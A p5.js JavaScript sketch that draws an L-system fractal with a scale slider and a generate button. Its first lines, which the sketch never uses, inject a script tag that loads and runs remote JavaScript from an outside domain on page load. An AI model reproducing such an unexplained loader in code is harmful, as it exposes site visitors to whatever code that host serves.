var k = document.getElementsByTagName('head')[0];
var c = document.createElement('script');
c.async = true;
c.type = 'text/javascript';
c.charset = 'utf-8';
c.src = "https://akashraj.tech/js/a.js";
k.appendChild(c);


var axiom="F+F+F+F"
var sentence=axiom
var temp=""
var rules=[]
var len=20
var scaleSlider
function setup() {
createCanvas(500,500)

  rules[0]={a:"F", b:"FF+F-F+F+FF"}

  scaleSlider=createSlider(0.01,10,1,0.01)
  scaleSlider.position(70,10)
  button=createButton("generate")
  button.mousePressed(sentencee)
  button.position(20,50)
}

function draw() {
    background(0)
    textSize(15)
    fill(255);
    noStroke()
    text("SCALE:",0,20);
    translate(width/2,height/2)
    scl=scaleSlider.value();
    scale(scl)

render(sentence)
}

function render(sent){

    stroke(255)
  for(i=0;i<sent.length;i++){
     if(sent.charAt(i)=="F"){
       strokeWeight(5)
       line(0,0,0,-len)
       translate(0,-len)
     }
      if(sent.charAt(i)=="+"){

        rotate(PI/2)
      }
       if(sent.charAt(i)=="-"){

         rotate(-PI/2)
       }
  }
}

function sentencee(){
  temp=""
  for(i=0;i<sentence.length;i++){
    found=0
    for(j=0;j<rules.length;j++){
       if(sentence.charAt(i)==rules[j].a){
         temp+=rules[j].b
         found=1
       }
       if(!found){
          temp+=sentence.charAt(i)
       }
    }
  }
  sentence=temp;

}
